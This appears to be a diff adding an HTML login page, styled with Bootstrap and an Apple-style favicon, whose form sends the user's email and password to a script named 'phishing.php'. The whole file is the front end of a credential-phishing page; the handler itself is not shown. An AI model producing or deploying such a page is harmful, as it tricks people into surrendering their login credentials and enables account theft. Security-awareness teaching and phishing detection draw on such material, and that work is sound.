@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Login Page</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="shortcut icon" href="https://www.freeiconspng.com/uploads/free-apple-icon-png-13.png" type="image/png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Indie+Flower&display=swap" rel="stylesheet">
+    <style>
+        body {
+            color: white;
+            background-color: #222;
+            zoom: 125%;
+            font-family: 'Indie Flower', cursive;
+            font-size: 1.5rem;
+        }
+
+        .outside {
+            border: 0.06rem solid white;
+            width: 25rem;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            margin-top: 5rem;
+            padding: 2rem;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="containter outside">
+        <h2 class="text-secondary text-success">
+            <center>Login</center>
+        </h2>
+        <br>
+        <form method="POST" action="phishing.php">
+            <div class="form-group">
+                <label for="emailId">Email</label>
+                <input autocomplete="off" type="email" id="emailId" name="usermail" class="form-control" required>
+            </div>
+            <br>
+            <div class="form-group">
+                <label for="pass">Password</label>
+                <input autocomplete="off" type="password" id="pass" name="userpass" class="form-control" required>
+            </div>
+            <br>
+            <button class="btn btn-outline-success">Submit</button>
+        </form>
+    </div>
+</body>
+
+</html>
